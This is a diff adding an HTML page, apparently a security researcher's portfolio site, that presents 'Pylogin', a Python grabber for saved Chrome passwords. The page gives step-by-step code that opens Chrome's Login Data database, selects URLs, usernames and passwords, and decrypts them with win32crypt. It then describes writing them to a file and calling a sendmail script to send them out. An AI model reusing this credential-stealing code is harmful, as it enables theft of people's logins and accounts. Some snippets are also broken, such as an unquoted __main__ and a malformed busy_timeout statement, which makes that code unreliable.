@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<title>Pylogin</title>
+		<link rel="icon" href="res/img/icon.png" />
+		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=0" />
+		<link rel="stylesheet" type="text/css" href="css/main.css" />
+		<link rel="stylesheet" media="screen and (max-width: 490px)" href="css/mobile.css" />
+		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-dark.min.css">
+		<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+		<script>hljs.initHighlightingOnLoad();</script>
+	</head>
+
+	<body>
+		<div id="wrapper">
+			<section class="left me">
+				<!--TODO: work out how to relative links to work e.g. res/img/avatar.png -->
+				<img src="https://avatars2.githubusercontent.com/u/22042789?s=460&amp;v=4" width="230" alt="Luis Garcia" class="avatar" />
+				<article>
+					<h2>Luis Garcia Calzada</h2>
+					<h3>Security Researcher</h3>
+					<nav id="social">
+						<ul>
+							<li><a href="https://github.com/luisxciv"><img src="res/img/gh.svg" alt="My GitHub" /></a></li>
+							<li><a href="https://twitter.com/lusiboyz"><img src="res/img/tw.svg" alt="My Twitter" /></a></li>
+						</ul>
+					</nav>
+				</article>
+			</section>
+
+			<section class="right" id="content">
+			
+				<article>
+					<pre>
+						<code class="cpp">
+if __name__ == __main__:
+    for i in range(1, 100):
+        if i % 3 == 0 and i % 5 == 0:
+            print("Welcome")
+        else:
+            print(i)
+						</code>
+					</pre>
+					<pre>@author Luis Garcia</pre>
+					<!-- Owner from Discord Server is my God -->
+					<h1 class="title">Pylogin: <span>sqlite3-db grabber</span></h1>
+
+					<p>The purpose of this script is to extract confidential data from google chrome's sqlite3 db. The logins table contains the columns; origin_url, username_value and password_vale as seen visually in this image. </p>
+					<code class="cpp"> Don't use this for anything illegal, don't be an a hole"</code>
+
+						.<br/>
+
+					<img src="http://1.bp.blogspot.com/-89GEp5SDYhM/TcjvFVh8RcI/AAAAAAAABTs/8oXRE8NWCCg/s1600/Chrome+URLs+table+record.png" alt="img" />
+					<h3>Operation: <span>How does it work? </span></h3>
+					<code class="cpp">
+						<font size="2" color="#9370db">
+						conn = sqlite3.connect(getenv("APPDATA")+r"\..\Local\Google\Chrome\User Data\Default\Login Data")
+						</font>
+					</code>
+					<p>1. Using the sqlite 3 module we can connect to the database </p>
+					<code>
+						<font size="2" color="#9370db">
+							connection = conn.cursor()</font>
+					</code>
+					<p>2. Once we have a connection we can create a cursor object and call its execute() method to perform Sql commands </p>
+					<code>
+						<font size="2" color="#9370db">
+						conn.execute(" busy_timeout = 300000")
+						</font>
+					</code>
+					<p>3. We are not able to execute any SQL commands while the db file is in use so adding a busy timeout will allow the script to wait until the API stops using th sqlite3 db</p>
+					<code>
+						<font size="2" color="#9370db">
+							connection.execute('Select action_url, username_value, password_value FROM logins')</font></code>
+					<p>4. We can select the fields and the data will be passed on to the cursor() object we made 2 steps ago </p>
+					<code>
+						<font size="2" color="#9370db">
+							password = win32crypt.CryptUnprotectData(result[2],None,None,None,0)[1]
+						</font>
+					</code>
+						<p>Then by using a for loop such as <code>for result in cursor.fetchall()</code> we can use the win32crypt module to unprotect the data and write it to a txt file and call the sendmail.py script</p>
+					<br /><br />
+				</article>
+
+
+				<hr />
+			</section>
+		</div>
+	</body>
+</html>
